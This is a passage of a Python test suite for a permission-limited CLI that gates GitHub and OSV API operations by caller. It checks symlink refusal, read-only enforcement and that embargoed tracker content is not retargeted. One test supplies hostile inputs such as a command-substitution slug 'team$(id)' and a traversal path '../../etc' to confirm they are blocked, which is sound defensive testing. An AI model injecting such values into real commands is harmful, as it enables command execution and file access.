    assert "gh issue view 7" in capsys.readouterr().out


def test_read_dispatcher_runs_http_reads(policy_path: Path, capsys: pytest.CaptureFixture[str]) -> None:
    rc = cli.main(
        [
            "--caller",
            "security-issue-triage",
            "osv-get-vuln",
            "GHSA-7rjr-3q55-vv33",
            "--config",
            str(policy_path),
            "--dry-run",
        ],
        read_only=True,
    )
    assert rc == cli.EXIT_OK
    out = capsys.readouterr().out
    assert "GET https://api.osv.dev/v1/vulns/GHSA-7rjr-3q55-vv33" in out

    rc_post = cli.main(
        [
            "--caller",
            "security-issue-triage",
            "osv-query-package",
            "jinja2",
            "PyPI",
            "2.11.2",
            "--config",
            str(policy_path),
            "--dry-run",
        ],
        read_only=True,
    )
    assert rc_post == cli.EXIT_OK
    out_post = capsys.readouterr().out
    assert "POST https://api.osv.dev/v1/query" in out_post
    assert "Body:" in out_post
    assert '"jinja2"' in out_post


# --------------------------------------------------------------------------
# Body files: single open, owned workspace, no symlinks
# --------------------------------------------------------------------------


def test_symlinked_body_is_refused(policy: config.Config, tmp_path: Path) -> None:
    """O_NOFOLLOW: a symlink sitting inside the workspace cannot smuggle out a
    file from elsewhere, even though its own path passes the containment test."""
    secret = tmp_path / "id_rsa"
    secret.write_text("PRIVATE KEY")
    link = policy.workspace / "innocent.md"
    link.symlink_to(secret)
    op = ops.resolve("issue-comment")
    with pytest.raises(ops.ParamError):
        cli._validate_params(op, ["7", str(link)], policy)


def test_group_writable_workspace_is_refused(policy: config.Config) -> None:
    """A workspace anyone can write is a workspace anyone can pre-seed, and
    these bodies become public comments."""
    body = policy.workspace / "note.md"
    body.write_text("hello")
    policy.workspace.chmod(0o770)
    op = ops.resolve("issue-comment")
    try:
        with pytest.raises(ops.ParamError, match="group- or world-writable"):
            cli._validate_params(op, ["7", str(body)], policy)
    finally:
        policy.workspace.chmod(0o700)


def test_body_is_read_once_not_reopened(policy: config.Config) -> None:
    """Content is captured at validation time, so a swap afterwards cannot
    change what gets published."""
    body = policy.workspace / "note.md"
    body.write_text("approved text")
    op = ops.resolve("issue-comment")
    _params, captured = cli._validate_params(op, ["7", str(body)], policy)
    body.write_text("substituted text")
    assert captured == b"approved text"


# --- the code-review read surface -------------------------------------------


def test_pr_searches_are_a_fixed_qualifier_not_a_query(policy: config.Config) -> None:
    """A search op picks whose queue to read; it can never supply a query."""
    for name, qualifier in (
        ("pr-search-review-requested", "--review-requested"),
        ("pr-search-mentions", "--mentions"),
        ("pr-search-reviewed-by", "--reviewed-by"),
    ):
        argv = ops.OPS[name].build(policy.as_mapping(), login="alice")
        assert isinstance(argv, list)
        assert argv[:3] == ["gh", "search", "prs"], name
        assert argv[argv.index(qualifier) + 1] == "alice", name
        # The repo is pinned by policy and the state is fixed open.
        assert argv[argv.index("--repo") + 1] == "acme/product", name
        assert argv[argv.index("--state") + 1] == "open", name
        # No free-text qualifier reached the argv.
        assert not any(a.startswith("--query") or a == "-q" for a in argv), name


def test_team_search_cannot_leave_the_upstream_org(policy: config.Config) -> None:
    argv = ops.OPS["pr-search-team-review-requested"].build(policy.as_mapping(), team="reviewers")
    assert isinstance(argv, list)
    assert argv[argv.index("--review-requested") + 1] == "acme/reviewers"


@pytest.mark.parametrize(
    "hostile",
    ["other-org/team", "../../etc", "a b", "team$(id)", "", "-x"],
)
def test_a_team_slug_may_not_carry_an_organisation_or_metacharacters(hostile: str) -> None:
    with pytest.raises(ops.ParamError):
        ops.team(hostile)


def test_every_code_review_operation_is_a_read() -> None:
    """The caller in the shipped policy example must reach nothing that writes."""
    read_only = {
        "viewer",
        "upstream-permission",
        "pr-review-context",
        "pr-files",
        "pr-diff",
        "pr-comments",
        "pr-reviews",
        "pr-checks",
        "pr-list",
        "pr-list-label",
        "pr-search-review-requested",
        "pr-search-mentions",
        "pr-search-reviewed-by",
        "pr-search-team-review-requested",
        "commits-by-path",
        "repo-file",
        "label-list",
        "gql-pr-review-threads",
    }
    for name in read_only:
        assert not ops.OPS[name].writes, f"{name} must be a read"


# --- an optional tracker ------------------------------------------------------
#
# A policy may legitimately name no tracker: an adopter whose skills only touch
# public work has none. Requiring one made *every* operation fail at load time
# over a value most of them never read.


CONFIG_NO_TRACKER = """
workspace = '{workspace}'

[repos]
upstream = "acme/product"

[values]
labels = ["needs triage"]
issue_states = ["open", "closed", "all"]
pr_states = ["open", "closed", "merged", "all"]

[callers]
"pr-management-code-review" = ["viewer", "pr-diff", "pr-list"]
"security-issue-sync" = ["issue-view"]
"""


@pytest.fixture()
def trackerless(tmp_path: Path) -> config.Config:
    # Its own directory: this fixture is used alongside `policy` in one test,
    # and both would otherwise claim `tmp_path / "scratch"`.
    root = tmp_path / "no-tracker"
    workspace = root / "scratch"
    workspace.mkdir(parents=True)
    workspace.chmod(0o700)
    cfg_path = root / "config.toml"
    cfg_path.write_text(CONFIG_NO_TRACKER.format(workspace=workspace))
    return config.load(cfg_path)


def test_a_policy_without_a_tracker_loads(trackerless: config.Config) -> None:
    assert trackerless.tracker_repo is None
    assert trackerless.upstream_repo == "acme/product"


def test_upstream_operations_work_without_a_tracker(trackerless: config.Config) -> None:
    """The regression: these died at load time over a value they never read."""
    assert ops.OPS["viewer"].build(trackerless.as_mapping()) == ["gh", "api", "user", "--jq", ".login"]
    argv = ops.OPS["pr-diff"].build(trackerless.as_mapping(), number="1")
    assert isinstance(argv, list)
    assert argv[argv.index("--repo") + 1] == "acme/product"


def test_a_tracker_operation_is_refused_when_no_tracker_is_configured(
    trackerless: config.Config,
) -> None:
    with pytest.raises(ops.ParamError, match="does not configure"):
        ops.OPS["issue-view"].build(trackerless.as_mapping(), number="1")


def test_every_tracker_operation_refuses_rather_than_retargeting(
    policy: config.Config, trackerless: config.Config
) -> None:
    """The failure worth guarding: embargoed content published to a public repo.

    Determined by construction rather than by a hand-kept list — any operation
    whose argv names the tracker when one *is* configured must raise when one is
    not, instead of quietly building an argv aimed somewhere else.
    """

    def args_for(op: ops.Op) -> dict[str, str]:
        sample = {
            "number": "1",
            "comment_id": "1",
            "run_id": "1",
            "ref": "main",
            "base": "main",
            "head": "v1",
            "prefix": "v1",
            "path": "a/b.py",
            "login": "alice",
            "team": "maintainers",
            "ghsa": "GHSA-aaaa-bbbb-cccc",
            "item_id": "PVTI_abc",
            "content_id": "I_abc",
            "title": "A tracker title",
        }
        out = {}
        for name in op.params:
            if name in op.body_files:
                return {}
            out[name] = policy.enum_values(op.enums[name])[0] if name in op.enums else sample[name]
        return out

    checked = 0
    for name, op in ops.OPS.items():
        if op.backend != "gh":
            continue
        args = args_for(op)
        if not args and op.params:
            continue
        res = op.build(policy.as_mapping(), **args)
        assert isinstance(res, list)
        with_tracker = " ".join(res)
        if "acme/tracker" not in with_tracker:
            continue
        checked += 1
        with pytest.raises(ops.ParamError, match="does not configure"):
            op.build(trackerless.as_mapping(), **args)
    # A guard that matched nothing would pass silently and prove nothing.
    assert checked > 5, f"only {checked} tracker operations exercised"


def test_upstream_is_still_required(tmp_path: Path) -> None:
    workspace = tmp_path / "scratch"
    workspace.mkdir(exist_ok=True)
    workspace.chmod(0o700)
    cfg_path = tmp_path / "config.toml"
    cfg_path.write_text(
        CONFIG_NO_TRACKER.format(workspace=workspace).replace('upstream = "acme/product"', "")
    )
    with pytest.raises(config.ConfigError):
        config.load(cfg_path)


def test_a_malformed_tracker_is_still_refused(tmp_path: Path) -> None:
    """Absent is allowed; a typo is not — it would point operations elsewhere."""
    workspace = tmp_path / "scratch"
    workspace.mkdir(exist_ok=True)
    workspace.chmod(0o700)
    cfg_path = tmp_path / "config.toml"
    cfg_path.write_text(
        CONFIG_NO_TRACKER.format(workspace=workspace).replace("[repos]", '[repos]\ntracker = "not-a-repo"')
    )
    with pytest.raises(config.ConfigError):
        config.load(cfg_path)


def test_every_http_builder_produces_https_url_from_configured_endpoints(policy: config.Config) -> None:
    for name, op in ops.OPS.items():
        if op.backend != "http-read":
            continue
        params = {}
        for p in op.params:
            if p in op.body_files:
                f = policy.workspace / "file"
                f.write_text("x")
                params[p] = str(f)
            elif p in op.enums:
                params[p] = policy.enum_values(op.enums[p])[0]
            else:
                params[p] = "dummy-value"
        req = op.build(policy.as_mapping(), **params)
        assert isinstance(req, dict)
        url = str(req.get("url", ""))
        assert url.startswith("https://")
        assert any(url.startswith(base) for base in policy.endpoints.values()), (
            f"{name} built {url} which does not start with a configured endpoint"
        )


def test_http_operation_with_writes_is_rejected() -> None:
    with pytest.raises(ValueError, match="must be read-only"):
        ops._register(ops.Op(name="test-bad", params=(), build=lambda: {}, backend="http-read", writes=True))


def test_run_http_execution_success(
    monkeypatch: pytest.MonkeyPatch, capsys: pytest.CaptureFixture[str]
) -> None:
    class MockResponse:
        def read(self) -> bytes:
            return b"hello world"

        def __enter__(self) -> MockResponse:
            return self

        def __exit__(
            self,
            exc_type: type[BaseException] | None,
            exc_val: BaseException | None,
            exc_tb: TracebackType | None,
        ) -> None:
            pass

    def mock_urlopen(
        req: urllib.request.Request,
        timeout: float | None = None,
    ) -> MockResponse:
        assert timeout == 30
        assert req.get_header("User-agent") == "apache-magpie-vetted-ops/0.1.0"
        return MockResponse()

    monkeypatch.setattr(urllib.request, "urlopen", mock_urlopen)
    rc = cli._run_http({"url": "https://example.com"}, body=None)
    assert rc == cli.EXIT_OK
    assert capsys.readouterr().out == "hello world"


def test_run_http_execution_httperror(
    monkeypatch: pytest.MonkeyPatch, capsys: pytest.CaptureFixture[str]
) -> None:
    def mock_urlopen(
        req: urllib.request.Request,
        timeout: float | None = None,
    ) -> NoReturn:
        raise urllib.error.HTTPError(req.full_url, 404, "Not Found", Message(), None)

    monkeypatch.setattr(urllib.request, "urlopen", mock_urlopen)
    rc = cli._run_http({"url": "https://example.com"}, body=None)
    assert rc == cli.EXIT_COMMAND
    assert "404 Not Found" in capsys.readouterr().err


def test_run_http_execution_urlerror(
    monkeypatch: pytest.MonkeyPatch, capsys: pytest.CaptureFixture[str]
) -> None:
    def mock_urlopen(
        req: urllib.request.Request,
        timeout: float | None = None,
    ) -> NoReturn:
        raise urllib.error.URLError("connection refused")

    monkeypatch.setattr(urllib.request, "urlopen", mock_urlopen)
    rc = cli._run_http({"url": "https://example.com"}, body=None)
    assert rc == cli.EXIT_COMMAND
    assert "connection refused" in capsys.readouterr().err


def test_run_http_execution_timeouterror(
    monkeypatch: pytest.MonkeyPatch, capsys: pytest.CaptureFixture[str]
) -> None:
    def mock_urlopen(
        req: urllib.request.Request,
        timeout: float | None = None,
    ) -> NoReturn:
        raise TimeoutError("timed out")

    monkeypatch.setattr(urllib.request, "urlopen", mock_urlopen)
    rc = cli._run_http({"url": "https://example.com"}, body=None)
    assert rc == cli.EXIT_COMMAND
    assert "timed out" in capsys.readouterr().err


def test_run_http_execution_non_https_rejected(capsys: pytest.CaptureFixture[str]) -> None:
    rc = cli._run_http({"url": "http://insecure.example.com"}, body=None)
    assert rc == cli.EXIT_COMMAND
    assert "missing valid https://" in capsys.readouterr().err


def test_project_resolves_outside_the_workspace() -> None:
    # The plugin ships this directory alone, without the workspace root, and
    # runs it with `uv run --project`. uv resolves every dependency group first,
    # so a group naming a workspace-only package (`magpie-dev`) or a
    # workspace-relative source breaks every plugin invocation.
    pyproject = tomllib.loads((Path(__file__).parents[1] / "pyproject.toml").read_text())
    assert "dependency-groups" not in pyproject
    assert "sources" not in pyproject.get("tool", {}).get("uv", {})
